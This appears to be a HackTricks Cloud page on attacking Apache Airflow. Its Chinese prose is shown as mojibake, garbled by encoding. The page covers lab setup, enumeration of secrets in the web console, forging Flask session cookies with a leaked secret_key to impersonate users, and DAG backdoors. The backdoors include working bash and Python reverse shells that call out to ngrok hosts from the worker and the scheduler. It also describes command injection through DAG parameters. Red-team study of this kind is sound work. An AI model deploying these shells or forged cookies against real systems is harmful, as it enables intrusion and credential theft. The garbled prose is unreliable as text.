# Apache Airflowå®‰å…¨æ€§

<details>

{% hint style="success" %}
å­¦ä¹ å¹¶ç»ƒä¹ AWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶ç»ƒä¹ GCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

[**Apache Airflow**](https://airflow.apache.org) ä½œä¸ºä¸€ä¸ªå¹³å°ï¼Œç”¨äº**ç¼–æ’å’Œè°ƒåº¦æ•°æ®ç®¡é“æˆ–å·¥ä½œæµ**ã€‚åœ¨æ•°æ®ç®¡é“çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œâ€œç¼–æ’â€ä¸€è¯è¡¨ç¤ºå®‰æ’ã€åè°ƒå’Œç®¡ç†æ¥è‡ªå„ç§æ¥æºçš„å¤æ‚æ•°æ®å·¥ä½œæµç¨‹çš„è¿‡ç¨‹ã€‚è¿™äº›ç»è¿‡ç¼–æ’çš„æ•°æ®ç®¡é“çš„ä¸»è¦ç›®çš„æ˜¯æä¾›ç»è¿‡å¤„ç†å’Œå¯æ¶ˆè´¹çš„æ•°æ®é›†ã€‚è¿™äº›æ•°æ®é›†è¢«å¹¿æ³›åº”ç”¨äºå„ç§åº”ç”¨ç¨‹åºï¼ŒåŒ…æ‹¬ä½†ä¸é™äºå•†ä¸šæ™ºèƒ½å·¥å…·ã€æ•°æ®ç§‘å­¦å’Œæœºå™¨å­¦ä¹ æ¨¡å‹ï¼Œæ‰€æœ‰è¿™äº›éƒ½æ˜¯å¤§æ•°æ®åº”ç”¨ç¨‹åºè¿è¡Œçš„åŸºç¡€ã€‚

åŸºæœ¬ä¸Šï¼ŒApache Airflowå°†å…è®¸æ‚¨**åœ¨å‘ç”ŸæŸäº‹æ—¶**ï¼ˆäº‹ä»¶ã€å®šæ—¶ä»»åŠ¡ï¼‰**è°ƒåº¦ä»£ç çš„æ‰§è¡Œ**ã€‚

## æœ¬åœ°å®éªŒå®¤

### Docker-Compose

æ‚¨å¯ä»¥ä½¿ç”¨æ¥è‡ª[**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml)çš„**docker-composeé…ç½®æ–‡ä»¶**å¯åŠ¨å®Œæ•´çš„Apache Airflow Dockerç¯å¢ƒã€‚ï¼ˆå¦‚æœæ‚¨åœ¨MacOSä¸Šï¼Œè¯·ç¡®ä¿ä¸ºdockerè™šæ‹Ÿæœºåˆ†é…è‡³å°‘6GBçš„RAMï¼‰ã€‚

### Minikube

è¿è¡ŒApache Airflowçš„ä¸€ç§ç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨**minikube**è¿è¡Œå®ƒï¼š
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflowé…ç½®

Airflowå¯èƒ½ä¼šåœ¨å…¶é…ç½®ä¸­å­˜å‚¨**æ•æ„Ÿä¿¡æ¯**ï¼Œæˆ–è€…æ‚¨å¯èƒ½ä¼šå‘ç°å­˜åœ¨å¼±é…ç½®ï¼š

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

åœ¨å¼€å§‹æ”»å‡»Airflowä¹‹å‰ï¼Œæ‚¨åº”è¯¥äº†è§£**æƒé™å¦‚ä½•å·¥ä½œ**ï¼š

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## æ”»å‡»

### Webæ§åˆ¶å°æšä¸¾

å¦‚æœæ‚¨å¯ä»¥è®¿é—®**Webæ§åˆ¶å°**ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿè®¿é—®ä»¥ä¸‹ä¸€äº›æˆ–æ‰€æœ‰ä¿¡æ¯ï¼š

* **å˜é‡**ï¼ˆè‡ªå®šä¹‰æ•æ„Ÿä¿¡æ¯å¯èƒ½å­˜å‚¨åœ¨æ­¤å¤„ï¼‰
* **è¿æ¥**ï¼ˆè‡ªå®šä¹‰æ•æ„Ÿä¿¡æ¯å¯èƒ½å­˜å‚¨åœ¨æ­¤å¤„ï¼‰
* åœ¨`http://<airflow>/connection/list/`ä¸­è®¿é—®å®ƒä»¬
* [**é…ç½®**](./#airflow-configuration)ï¼ˆæ•æ„Ÿä¿¡æ¯å¦‚**`secret_key`**å’Œå¯†ç å¯èƒ½å­˜å‚¨åœ¨æ­¤å¤„ï¼‰
* åˆ—å‡º**ç”¨æˆ·å’Œè§’è‰²**
* æ¯ä¸ªDAGçš„**ä»£ç **ï¼ˆå¯èƒ½åŒ…å«æœ‰è¶£çš„ä¿¡æ¯ï¼‰

### æ£€ç´¢å˜é‡å€¼

å˜é‡å¯ä»¥å­˜å‚¨åœ¨Airflowä¸­ï¼Œä»¥ä¾¿**DAG**å¯ä»¥**è®¿é—®**å®ƒä»¬çš„å€¼ã€‚è¿™ç±»ä¼¼äºå…¶ä»–å¹³å°çš„ç§˜å¯†ã€‚å¦‚æœæ‚¨æœ‰**è¶³å¤Ÿçš„æƒé™**ï¼Œå¯ä»¥åœ¨GUIä¸­è®¿é—®å®ƒä»¬ï¼Œç½‘å€ä¸º`http://<airflow>/variable/list/`ã€‚\
é»˜è®¤æƒ…å†µä¸‹ï¼ŒAirflowå°†åœ¨GUIä¸­æ˜¾ç¤ºå˜é‡çš„å€¼ï¼Œä½†æ˜¯æ ¹æ®[**è¿™é‡Œ**](https://marclamberti.com/blog/variables-with-apache-airflow/)ï¼Œå¯ä»¥è®¾ç½®ä¸€ä¸ª**å˜é‡åˆ—è¡¨**ï¼Œå…¶**å€¼**å°†æ˜¾ç¤ºä¸º**æ˜Ÿå·**åœ¨**GUI**ä¸­ã€‚

![](<../../.gitbook/assets/image (164).png>)

ç„¶è€Œï¼Œè¿™äº›**å€¼**ä»ç„¶å¯ä»¥é€šè¿‡**CLI**ï¼ˆéœ€è¦å…·æœ‰DBè®¿é—®æƒé™ï¼‰ã€**ä»»æ„DAG**æ‰§è¡Œã€**API**è®¿é—®å˜é‡ç«¯ç‚¹ï¼ˆéœ€è¦æ¿€æ´»APIï¼‰ï¼Œç”šè‡³**GUIæœ¬èº«**æ¥**æ£€ç´¢**ã€‚\
è¦ä»GUIä¸­è®¿é—®è¿™äº›å€¼ï¼Œåªéœ€**é€‰æ‹©è¦è®¿é—®çš„å˜é‡**ï¼Œç„¶åå•å‡»**æ“ä½œ -> å¯¼å‡º**ã€‚\
å¦ä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡**æœç´¢è¿‡æ»¤**æ‰§è¡Œ**æš´åŠ›ç ´è§£**ä»¥è·å–**éšè—å€¼**ï¼š

![](<../../.gitbook/assets/image (152).png>)

### ç‰¹æƒå‡çº§

å¦‚æœ**`expose_config`**é…ç½®è®¾ç½®ä¸º**True**ï¼Œä»**ç”¨æˆ·è§’è‰²**åŠä»¥ä¸Šå¯ä»¥åœ¨**Webä¸­è¯»å–**é…ç½®ã€‚åœ¨æ­¤é…ç½®ä¸­ï¼Œä¼šæ˜¾ç¤º**`secret_key`**ï¼Œè¿™æ„å‘³ç€ä»»ä½•å…·æœ‰æ­¤æœ‰æ•ˆå¯†é’¥çš„ç”¨æˆ·éƒ½å¯ä»¥**åˆ›å»ºè‡ªå·±çš„å·²ç­¾åcookieä»¥å†’å……ä»»ä½•å…¶ä»–ç”¨æˆ·å¸æˆ·**ã€‚
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAGåé—¨ï¼ˆAirflow workerä¸­çš„RCEï¼‰

å¦‚æœæ‚¨å¯¹ä¿å­˜DAGçš„ä½ç½®å…·æœ‰**å†™å…¥è®¿é—®æƒé™**ï¼Œæ‚¨å¯ä»¥**åˆ›å»ºä¸€ä¸ª**DAGï¼Œè¯¥DAGå°†å‘æ‚¨å‘é€ä¸€ä¸ª**åå‘ shell**ã€‚\
è¯·æ³¨æ„ï¼Œæ­¤åå‘ shell å°†åœ¨**airflow workerå®¹å™¨**ä¸­æ‰§è¡Œï¼š
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG åé—¨ï¼ˆAirflow è°ƒåº¦å™¨ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼‰

å¦‚æœæ‚¨å°†æŸäº›å†…å®¹è®¾ç½®ä¸ºåœ¨**ä»£ç çš„æ ¹ç›®å½•ä¸­æ‰§è¡Œ**ï¼Œåœ¨æ’°å†™æœ¬æ–‡æ—¶ï¼Œå®ƒå°†åœ¨å°†å…¶æ”¾å…¥DAGæ–‡ä»¶å¤¹åçš„å‡ ç§’é’Ÿåç”±è°ƒåº¦å™¨**æ‰§è¡Œ**ã€‚
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG åˆ›å»º

å¦‚æœæ‚¨è®¾æ³•**å…¥ä¾µ DAG é›†ç¾¤å†…çš„ä¸€å°æœºå™¨**ï¼Œæ‚¨å¯ä»¥åœ¨ `dags/` æ–‡ä»¶å¤¹ä¸­åˆ›å»ºæ–°çš„**DAG è„šæœ¬**ï¼Œå®ƒä»¬å°†è¢«**å¤åˆ¶åˆ° DAG é›†ç¾¤ä¸­çš„å…¶ä»–æœºå™¨**ã€‚

### DAG ä»£ç æ³¨å…¥

å½“æ‚¨ä» GUI æ‰§è¡Œ DAG æ—¶ï¼Œå¯ä»¥å‘å…¶**ä¼ é€’å‚æ•°**ã€‚\
å› æ­¤ï¼Œå¦‚æœ DAG æ²¡æœ‰æ­£ç¡®ç¼–ç ï¼Œå®ƒå¯èƒ½**å®¹æ˜“å—åˆ°å‘½ä»¤æ³¨å…¥æ”»å‡»**ã€‚\
è¿™å°±æ˜¯åœ¨æ­¤ CVE ä¸­å‘ç”Ÿçš„æƒ…å†µï¼š[https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

æ‚¨éœ€è¦äº†è§£çš„ä¸€åˆ‡ï¼Œä»¥**å¼€å§‹åœ¨ DAG ä¸­å¯»æ‰¾å‘½ä»¤æ³¨å…¥**ï¼Œå°±æ˜¯**å‚æ•°**æ˜¯é€šè¿‡ä»£ç **`dag_run.conf.get("param_name")`**æ¥**è®¿é—®**çš„ã€‚

æ­¤å¤–ï¼Œç›¸åŒçš„æ¼æ´å¯èƒ½ä¼šå‡ºç°åœ¨**å˜é‡**ä¸­ï¼ˆè¯·æ³¨æ„ï¼Œå¦‚æœå…·æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œæ‚¨å¯ä»¥åœ¨ GUI ä¸­**æ§åˆ¶å˜é‡çš„å€¼**ï¼‰ã€‚å˜é‡æ˜¯é€šè¿‡ä»¥ä¸‹æ–¹å¼**è®¿é—®**çš„ï¼š
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
å¦‚æœå®ƒä»¬ä¾‹å¦‚è¢«ç”¨åœ¨ä¸€ä¸ªbashå‘½ä»¤ä¸­ï¼Œä½ å¯ä»¥æ‰§è¡Œå‘½ä»¤æ³¨å…¥ã€‚

<details>

{% hint style="success" %}
å­¦ä¹ å¹¶å®è·µAWS Hackingï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶å®è·µGCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
